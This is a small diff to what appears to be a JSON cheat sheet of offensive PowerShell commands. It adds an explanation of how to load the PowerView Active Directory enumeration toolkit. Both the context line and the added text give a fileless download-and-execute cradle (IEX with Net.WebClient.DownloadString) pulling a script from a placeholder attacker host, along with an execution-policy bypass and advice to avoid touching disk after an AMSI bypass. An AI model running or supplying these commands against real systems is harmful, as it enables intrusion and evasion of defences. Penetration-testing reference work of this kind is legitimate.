@@ -94,5 +94,6 @@
       "label": "Load fileless (after AMSI bypass)",
       "command": "iex (New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')"
     }
-  ]
+  ],
+  "explain": "Loads the PowerView enumeration toolkit into the session:\n  Import-Module .\\PowerView.ps1   make the Get-Domain*/Find-*/Invoke-* cmdlets available\nRequired before any PowerView command; run 'powershell -ep bypass' first if the execution policy blocks it, or load it fileless with IEX (New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1') to avoid touching disk."
 }
